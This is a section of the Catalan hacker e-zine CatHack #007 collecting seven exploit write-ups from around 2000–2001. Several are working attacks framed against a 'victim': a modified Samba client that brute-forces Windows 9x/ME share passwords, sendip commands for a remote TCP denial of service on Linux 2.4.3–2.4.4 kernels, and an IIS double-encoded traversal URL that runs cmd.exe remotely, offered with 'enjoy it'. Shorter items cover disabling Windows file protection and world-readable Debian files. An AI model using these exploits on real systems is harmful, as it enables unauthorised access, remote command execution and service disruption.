.------------------.
| CatHack #007 - 3 |
| 07x03 - Exploits |
`------------------'

INDEX D'EXPLOITS:
-----------------

1.- Password NetBios sota w9x/ME - Alejandro Castan          $01$
2.- Windows 2000 System File Checker - Alejandro Castan      $02$
3.- Possible fallo de seguretat en Debian 2.2 - Pancake      $03$
4.- Buffer Overflow en One Touch Wap - Pop.tPH - Pancake     $04$
5.- DoS remot en kernels 2.4.x !!                            $05$
6.- Execucions remotes en IIS 5                              $06$
7.- Fallo greu i local de permisos en Debian (potato/sid)    $07$


--------------------------------------------------------------------
////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------
$01$


                             EL RACO DE L'EXPLOIT

                           per Alex Castan Salinas
                              alex.castan@upc.es

                            *--------------------*
                            |                    |
                            |  El teu ordinador  |
                            |      es mort...    |
                            | i abans estava viu |
                            |     _______        |
                            |    |.-----.|       |
                            |    ||x . x||       |
                            |    ||_.-._||       |
                            |    `--)-(--'       |
                            |   __[=== o]___     |
                            |  |:::::::::::|\    |
                            |  `-=========-'()   |
                            |                    |
                            | No hauries d'haver |
                            |    instal.lat :    |
                            |                    |
                            |  -= Windows'95 =-  |
                            *--------------------*



Vulnerabilitat : comprovacio incorrecte de contrasenya a NetBIOS.

Afecta a : Windows 95, 98 i ME.
No afecta a : Windows NT 4.0 i Windows 2000.


Text elaborat a partir d'un missatge enviat per l'empresa NSFOCUS a la llista
de distribucio sobre seguretat Bugtraq. http://www.securityfocus.com/bid/1780

Degut a una greu errada en la implementacio de Microsoft del protocol NetBIOS,
qualsevol atacant pot accedir facilment als recursos compartits (fitxers,
carpetes i impressores) malgrat la proteccio mitjancant contrasenya d'aquests.



INTRODUCCIO
-----------
A Windows 95, 98 i ME els recursos compartits poden protegir-se mitjancant
contrasenya, per tal que nomes puguin accedir-hi els usuaris que coneguin
aquesta. En canvi, a Windows NT i 2000, per accedir als recursos compartits es
poden establir controls basats en permisos d'usuaris millor que en
contrasenyes i, per lo tant, aquests no son susceptibles d'aquesta
vulnerabilitat.



VULNERABILITAT
--------------
I que passa amb la proteccio mitjancant contrasenya dels recursos compartits?
Doncs passa que una vulnerabilitat a la part de verificacio de contrasenyes
(protocol CIFS) fa que nomes es comparin les contrasenyes en la longitud
especificada per l'ordinador que vol accedir al recurs (client) i no en la
longitud especificada per l'ordinador que comparteix el recurs (servidor). Per
lo tant un usuari malicios pot accedir a qualsevol recurs compartit sense
necessitat de coneixer la contrasenya sencera assignada a aquest recurs. Per
exemple: si es protegeix un recurs compartit amb la contrasenya PEP, es pot
accedir a aquest enviant com a contrasenyes P, PE i PEP. Aixi, a l'usuari
malicios nomes li cal establir com a longitud de contrasenya un byte i provar
els 256 possibles valors per accedir al recurs compartit. A mes a mes, com a
maxim nomes li caldrien (256*longitud_contrasenya) intents per obtenir la
contrasenya original.



COM EXPLOTAR LA VULNERABILITAT
------------------------------
Si feu proves del que acabo d'explicar amb dos ordinadors connectats en xarxa,
comprovareu que amb el metode anterior no podeu accedir als recursos
compartits protegits mitjancant contrasenya. Aixo es degut a que el programa
client que utilitzeu per accedir al recurs compartit no esta preparat. Haurem
d'emprar un programa client propi:

1. Si intenteu accedir des d'un ordinador amb sistema operatiu Windows, el mes
   rapid es que feu servir el programa PQwak2, escrit per Shane Hird. Trobareu
   aquest programa a algun magatzem de fitxers dedicat al hacking, com per
   exemple http://packetstorm.securify.com.

   Per fer servir PQwak2 heu els passos son els seguents:

 - Si la victima es a la vostra xarxa local, cerqueu la icona d'entorn de
   xarxa al vostre escriptori. Accediu i busqueu dins la xarxa una maquina
   victima amb recursos compartits mitjancant contrasenya.

 - Obtenir l'adreca IP de la victima escrivint a la linia de comandes
   "nbtstat -a nom_victima" i despres "nbtstat -c". Si aixo no funciona
   "arp -a" i cercar l'adreca MAC que coincideix amb l'adreca fisica
   aconseguida amb "nbtstat -a hostname". Si encara aixo no funciones,
   connecteu-vos a la victima i escriviu "netstat -an".

 - Obtenir el nom de xarxa de la victima, que normalment coincideix amb el nom
   que apareix a l'entorn de xarxa (NetBIOS). Un cop sabeu l'adreca IP de la
   victima, podeu escriure "nbtstat -A IP_victima" i obtindreu el nom (servei
   <20>).

 - Obtenir el nom del recurs compartit de la victima.

 - Establir el temps entre prova i prova de contrasenya, per tal de deixar
   prou temps per rebre una resposta de la victima. Per una xarxa local un
   valor entre 50 i 100 es prou, pero per un ordinador a Internet millor
   proveu amb un valor de 1000 o superior.

2. Si feu servir altre sistema operatiu (Linux, FreeBSD, etc.) el mes senzill
   es aconseguir el codi font d'un client ja fet (Samba) i modificar-lo segons
   les nostres necessitats.

 - Connecteu-vos a Internet i baixeu l'ultim codi font de Samba a
   http://www.samba.org/

 - Descomprimiu-lo:

   $ tar zxvf samba-2.0.7.tar.gz

 - El codi a modificar hi es al fitxer samba-2.0.7/source/client/client.c

 - Cerqueu dins el fitxer la funcio "do_connect", que intenta establir una
   connexio:

   struct cli_state *do_connect(char *server, char *share)

 - Declareu tres noves variables:

   int i;
   char contrasenya[8+1] = "";
   BOOL connexio;

 - El codi a canviar esta entre les linies DEBUG(4,(" session setup ok\n")) i
   DEBUG(4,(" tconx ok\n")).

   /*
    * Aquest codi cal treure-ho o posar-ho com a comentari !!!
    *
    * if (!cli_send_tconX(c, share, "?????", password, strlen(password)+1)) {
    *   DEBUG(0,("tree connect failed: %s\n", cli_errstr(c)));
    *   cli_shutdown(c);
    *   return NULL;
    *   }
    */

    /* Enviem la contrasenya sense encriptar */
    c->sec_mode = 0;

    /* Suposem la longitud de la contrasenya de 8 caràcters */
    for (i=0, connexio=True; connexio && (i<8); i++)
       for (contrasenya[i] = 1, connexio=False; 
            (contrasenya[i] != 0) && !(connexio=cli_send_tconX(c, share, "?????", contrasenya, i+1)); 
            contrasenya[i]++);

    if (strlen(contrasenya)>0)
       DEBUG(0, ("Contrasenya: %s\n", contrasenya));
    else {
       DEBUG(0,("tree connect failed: %s\n", cli_errstr(c)));
       cli_shutdown(c);
       return NULL;
       }

 - Compilar e instal.lar Samba:

 - Obtenir el nom dels recursos compartits d'una victima:
   $./smbclient -L nom_victima -N

 - Connectar-se amb el nou client al recurs compartit de la victima:
   $./smbclient \\\\nom_victima\\nom_recurs -N



EL PEGAT
--------
Tenim varies solucions per aquesta vulnerabilitat:

 * Microsoft ha tret un pegat per aquesta vulnerabilitat, que trobareu a
   http://www.microsoft.com/technet/security/bulletin/fq00-072.asp

 * Mentrestant podeu inhabilitar la comparticio de recursos a Windows 95, 98 i
   ME.

 * Tambe podeu fer servir un control d'acces a recursos basat en permisos
   d'usuaris millor que en contrasenyes. Encara millor si s'utilitza Windows
   NT o 2000 com servidors de fitxers.



--------------------------------------------------------------------
////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------

$02$

                             EL RACO DE L'EXPLOIT

                           per Alex Castan Salinas
                              alex.castan@upc.es

                            *--------------------*
                            |                    |
                            |  El teu ordinador  |
                            |      es mort...    |
                            | i abans estava viu |
                            |     _______        |
                            |    |.-----.|       |
                            |    ||x . x||       |
                            |    ||_.-._||       |
                            |    `--)-(--'       |
                            |   __[=== o]___     |
                            |  |:::::::::::|\    |
                            |  `-=========-'()   |
                            |                    |
                            | No hauries d'haver |
                            |    instal.lat :    |
                            |                    |
                            |  -= Windows'00 =-  |
                            *--------------------*



Vulnerabilitat :
A Windows 2000, un valor indocumentat del registre inhabilita completament el
sistema de proteccio de fitxers (Windows 2000 System File Checker).

Afecta a :
Windows 2000

Text elaborat a partir d'un missatge aparegut a les llistes de distribucio
sobre seguretat Bugtraq i NTBugtraq. Per que comproveu que, encara que passa
el temps, Microsoft continua fent les coses com sempre.



INTRODUCCIO
-----------
El sistema de proteccio de fitxers de Windows 2000, encara que pesat,
proporciona un bon grau d'estabilitat del sistema i inclus algun nivell de
proteccio contra virus i troians, prevenint que fitxers del sistema siguin
modificats sense notificar-ho a l'usuari.



VULNERABILITAT
--------------
Despres que un senyor (Jeremy Collake - collake@charter.net) dediques sis
hores a revisar el codi desensamblat dels fitxers sfc.dll, sfcfiles.dll i
winlogon.exe de Windows 2000, va descobrir que per inhabilitar permanentment
la proteccio de fitxers nomes calia col.locar a 0xffffff9d el valor SFCDisable
de la clau HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon del
registre (veure
http://support.microsoft.com/support/kb/articles/Q222/4/73.ASP).

En reiniciar l'ordinador, s'escriu l'esdeveniment ID 64032 del Windows File
Protection en el log del sistema, amb el missatge "Windows File Protection is
not active on this system". Tot intent de reemplacar o esborrar fitxers
funciona, com si s'hagues arrencat l'ordinador en mode "a prova d'errors".



COM EXPLOTAR LA VULNERABILITAT
------------------------------
1. Si tenim acces local a la maquina, amb l'utilitat regedit modifiquem el
registre de Windows tal com hem comentat. Per fer aixo en Windows 2000 em
sembla que calen, pero, privilegis d'administrador.

2. Un virus que al seu codi modifiqui el valor SFCDisable del registre.

3. I tot el que la imaginacio us doni de si ... (jo ara estic cansat i em fa
mandra pensar).



EL PEGAT
--------
No ... els mesos passen pero Microsoft encara no ha tret cap pegat per aquesta
vulnerabilitat. Em sembla que el Service Pack 1 per Windows 2000 tampoc ho
soluciona :-(.



         "... I'm not one of those who think Bill Gates is the devil.
        I simply suspect that if Microsoft ever met up with the devil,
              it wouldn't need an interpreter." - Nick Petreley

--------------------------------------------------------------------
////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------

$03$

Possible fallo de seguretat en Debian 2.2 (potato)
--------------------------------------------------

Autor: Pop.tPH (Pancake)
Sistemes afectats: debian amb mutt. (posiblement altres dist. tb)
Solució: chmod 600 /etc/Muttrc

Com que el mode gràfic em dona bastant de pal, acostumo a buscar
alternatives com per exemple el mode texte (q fins que no sigui
3d-aalib no triumfarà xD).

Doncs bé, de clients de correu, Linux va bastant justet, tot s'ha
de dir, encara que n'hi hagin molts només podem trobar alguns de
decents: per mode grafic (messenger, balsa o kmail), pero el kmail
peta per tot arreu sobre la debian2.2, aixi que vaig optar per
instal.lar els de texte...fetchmail (uee!!), pine i finalment el
mutt (el meu nenet ;)

Vaig començar a configurar el mutt...i amb que em vaig trobar???
Doncs amb un fallo de seguretat com una casa!!! argh!!!

$ ls -l /etc/Muttrc
-rw-r--r--    1 root     root     6574   Feb 17 2001 /etc/Muttrc

que es aixo???? permisos de lectura per tothom????

Bé, si no sabeu quines son les ultimes 3 linies d'aquest fitxer
de configuració no us espantarieu:

# set pop_host=""
# set pop_pass=""
# set pop_user=""

logicament un usuari q no s'hi fixi i agafi aquest fitxer com el
de configuració enlloc d'un propi, i no canvii els permissos,
qualsevol usuari podrà saber quin es el l/p i el host del seu
mail...cosa bastant compromesa.



--------------------------------------------------------------------
////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------


$04$

    /                                                \
   [    Buffer Overflow en One Touch Wap - Pop.tPH    ]
    \                                                /



Segons he pogut comprobar, el mobil d'alcatel one touch wap (el més
cutre dels que tenen wap) (10.000 pts) - A part de poder comprobar
com l'ajuda sobre wap i demés es nul.la, la configuració de xarxa
és pesima, i només es pot configurar quan estem conectats.

Dins d'aquest contorn, on han volgut treure un producte fora de les
seves capacitats, ens trobem amb un fallo, un fallo que en versions
antigues no el tenia.

Es possible provocar es desbordament de buffer a l'hora de marcar.

Com podem comprovar...podem marcar moltissims nombre, i quan passa
de 20 (crec) te'l pren per invàlid, ja que realment no hi han
numeros tant llargs.

Si marquem un numero superior o igual a 23, el mobil ens dira que
no es valid...pero si li diem que el converteixi a euros (ens
donarà error dient que no es convertible), llavors si intentem
marcar, el mobil intentarà trucar, llavors, s'apagarà...i ens
veurem desconectats de la xarxa, al cap d'uns 30 segons, el
mobil es recuperarà, es tornarà a encendre sol.

i ja ta :P


--------------------------------------------------------------------
////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------

$05$

kernel-2.4.* remote denial of service

---------

Autor: azathoth <azathoth@zxmail.com>
Vulnerable: kernels 2.4.3 i 2.4.4
Solucio: actualitzar a kernel-2.4.5


1. Introduccio

Alguns kernels de la serie 2.4 pateixen d'un problema de realimentacio en
el codi de TCP vulnerable a atacs remots. Aquest atac provocarà una degradacio
considerable del servei.


2. Descripcio

El problema es produeix al enviar un paquet TCP SYN amb direccio origen
"aaa.bbb.ccc.ddd:wxyz" i direccio desti "aaa.bbb.ccc.ddd:wxyz" a un proces
que escolta per a conexions TCP en la mateixa direccio "aaa.bbb.ccc.ddd:wxyz".

El que següeix es la sortida del tcpdump durant una prova en la meva maquina.
El proces al que he dirigit el paquet es el telnet (23).

#tcpdump -i lo
10:20:59.163224 localhost.telnet > localhost.telnet: S 2547728175:2547728175(0) win 65535
10:20:59.163289 localhost.telnet > localhost.telnet: S 2482930519:2482930519(0) ack 2547728176 win 
32767 <mss16396> (DF)
10:20:59.163321 localhost.telnet > localhost.telnet: . ack 2547728176 win 32767 (DF)
10:20:59.163342 localhost.telnet > localhost.telnet: . ack 2547728176 win 32767 (DF)
10:20:59.163361 localhost.telnet > localhost.telnet: . ack 2547728176 win 32767 (DF)
10:20:59.163380 localhost.telnet > localhost.telnet: . ack 2547728176 win 32767 (DF)
10:20:59.163399 localhost.telnet > localhost.telnet: . ack 2547728176 win 32767 (DF)

Recordatori del format de tcpdump per a paquets TCP:
src > dst: flags data-seqno ack window urgent options

El que passa es bastant absurd pero te la seva logica. Si no sabeu com funciona
el triple handshake (la manera d'establir una conexio en TCP) mireu el rfc0793
sobre TCP que ho explica. Pero tornem a l'exemple a veure que passa:

El primer paquet que s'envia (manualment) simula un inici de conexio al port del
telnet des de el mateix port de telnet. Per tant, quan el codi del TCP contesta amb
el segon paquet (ACK + num seqüencia) en realitat s'esta contestant a si mateix.
La rebuda d'aquest paquet es contesta amb un ACK per a indicar que s'ha rebut
el numero de seqüencia. Al rebre aquest ACK, TCP contesta enviant el mateix
paquet per a indicar de nou que s'ha rebut correctament el numero de seqüencia.
El cas es que un cop hem arribat fins aqui aquesta seqüencia es reprodueix
indefinidament fins que matem el process que estava escoltant en el port.
Fixeu-vos que en aquest punt s'esta enviant un paquet de ACK cada 20 microsegons!

La degradacio del servei que es produeix va en funcio del nombre d'aplicacions
basades en sockets que hi hagi corrents en el moment. Per a mirar un cas extrem
executeu l'exploit local des de una sessio de X-Window.


3. Exploit

La manera mes senzilla de explotar aquesta vulnerabilitat es a traves
de l'utilitat *sendip* que podeu trobar aqui
	<http://www.earth.li/projectpurple/progs/sendip.html>
Noteu que enviarem paquets malformats, per tant ens caldra tenir privilegis
de superusuari per a poder fer anar l'exploit.

com a exemple, si una persona X vol atacar el host qualsevol.com del que
sap que te obert el port 22 faria:

# host qualsevol.com
qualsevol.com has adress aaa.bbb.ccc.ddd
# sendip qualsevol.com -p TCP -is aaa.bbb.ccc.ddd -id aaa.bbb.ccc.ddd \
-ts 22 -td 22 -d ""

per comprovar rapidament el problema en el propi host podeu fer:

# sendip localhost -p TCP -is 127.0.0.1 -id 127.0.0.1 -ts 23 -td 23 -d ""

si no teniu el telnet obert proveu amb qualsevol altre servei TCP


Observacio: Per a explotar la vulnerabilitat de forma remota caldrà que els
nodes intermitjos us permetin enviar aquest tipus de paquets malformats.
Que jo sapiga, en la majoria de casos aixo es possible


4. Solucio

Fa uns dies que ha ha sortit la versio 2.4.5 del kernel. He realitzat proves
i per lo vist no es vulnerable. Si teniu alguna necessitat per a emprar
kernels de la serie 2.4.x el mes convenient es actualitzar la versio.
Recordeu que no tots els kernels anteriors al 2.4.5 son vulnerables.
Proves sobre 2.4.0 demostren que el problema es posterior (probablement apareix
en 2.4.3). Si encara esteu amb el 2.2.x no us afectara aquest problema (pero
en aquest cas haureu d'anar amb compte amb el ptrace :P)

azathoth

--------------------------------------------------------------------
////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------

$06$



Hola a tothom.

Us enrecordeu que la setmana pasada us vaig enviar un exploit que permetia
fer root remot als servidors web amb Microsoft IIS 5.0?

Doncs avui ha aparegut una altre vulnerabilitat grosa que ens permet
executar comandes als servidors tant IIS 4.0 com als IIS 5.0.

Quan enviem una comanda, com per exemple la següent, el servidor no deixa
executar-la:

http://victima/scripts/../../cwinnt/system32/cmd.exe?/c+dir+c:\

Si canviem els \ per %5c el servidor tampoc no deixa executar-la:

http://victima/scripts/..%5c..%5cwinnt/system32/cmd.exe?/c+dir+c:\

Si canviem els \ per algun equivalent a Unicode el servidor tampoc no deixa
executar-la si està parxejat (aquesta vulneravilitat es va descubrir fa uns
mesos).

Pero si canvien algun dels caracters del %5c pel seu equivalent (% -> %25,
5 -> %35, c -> %63) llavors si que deixa executar-la:

Per exemple: %5c -> %255c ó %%35c ó %%35%63 ó %25%35%63 ó ... etc.

Així queda:

http://victima/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\

Lo millor de tot és que ahir mateix Mocosoft va treure el Service Pack 2 per
Windows 2000 i els parxes per les últimes vulnerabilitats de IIS 5.0, i no
han pogut incloure el pegat per aquesta vulneravilitat.

A disfrutar-la !


-alex castan-


--------------------------------------------------------------------
////////////////////////////////////////////////////////////////////
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
--------------------------------------------------------------------

$07$

No entenc com la debian pot tenir un fallo que no el té la RedHat

Doncs bé, el problema es de permisos, el directori de root, té
permisos de lectura i execució per a tothom...amb el consequent
perill.

per tant recomano recorrer al parche:

----------[parche cutre]------------
#!/bin/sh
chmod 700 /root
----------[parche cutre]------------

Doncs bé el pop es despedeix de la secció d'exploits amb el
parche més cutre de la història dels parches :)

                     __________
      \     /       /          \
       )   (       |   POP!!!   |
      /     \       \__________/
     (       )            |
      >(ºoº)<      -------' 
     (       )
      \     /
       )   (
      /     \